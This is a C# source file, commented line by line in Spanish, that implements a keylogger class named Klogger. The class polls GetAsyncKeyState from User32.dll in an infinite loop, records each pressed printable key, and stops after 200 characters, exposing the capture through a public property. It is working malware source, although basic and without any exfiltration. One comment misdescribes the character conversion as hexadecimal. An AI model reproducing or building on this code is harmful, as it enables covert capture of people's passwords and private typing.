//Usamos las propiaedades del sistema C#
using System;
//declaramos esta librería para poder importar un archivo desde c:/windows/system32
using System.Runtime.InteropServices;
//declaramos est librería para poder utilizar tiempos dentro del keylogger
using System.Threading;

//Se declara el nombre del proyecto para esta clase
namespace WinFormsApp2
{
    //Se declara el nombre d ela clase
    class Klogger
    {
        //importamos el archivo User32.dll que permite capturar teclas precionada o sin precionar
        [DllImport("User32.dll")]
        //declaramos como un entero el datos que vamos a recibir cuando se preciones una tecla
        public static extern int GetAsyncKeyState(Int32 i);
        //declaramos una variable donde almacenaremos las teclas presionadas
        private string captura = "";
        //declaramos esta variable como acceso publico para que otras clases accedan a el
        public string Captura { get => captura; set => captura = value; }
        //declaramos el constructor de la clase
        public Klogger()
        {
            //iniciamos la funcion donde esta el keylogger
            inicio();
        }

        //esta es la funcion donde esta el keylogger, se la declara
        public void inicio()
        {
            //instanciamos a la variable para que tenga un valor vacio
            Captura = "";
            //empezamos un bucle infinito con este while
            while (true)
            {
                //declaramos un tiempo de espera para no consumir muchos recursos de la computadora
                Thread.Sleep(10);
                //iniciamnos un bucle que vaya de 32 a 127, esto es porque esos con los decimales asignados a las teclas de la computadora
                for(int i=32; i < 127; i++)
                {
                    //verificamos en cada una de la teclas si esta presionada o no
                    int ketState = GetAsyncKeyState(i);
                    //el numero 32769 es el numero asignado cunado una tecla esta precionada, con este if verificamos eso
                    if (ketState == 32769)
                    {
                        //guardamos la tecla precioanda convirtiendo el nuemero de la tecla a un caracter hexadecimal
                        Captura = Captura + "," + ((char)i);
                    }
                }
                //con este if controlamos que luego de 200 teclas capturadas termine el bucle
                if (Captura.Length == 200)
                {
                    //rompemos el bucle infinito
                    break;
                }
            }
        } 
    }

}
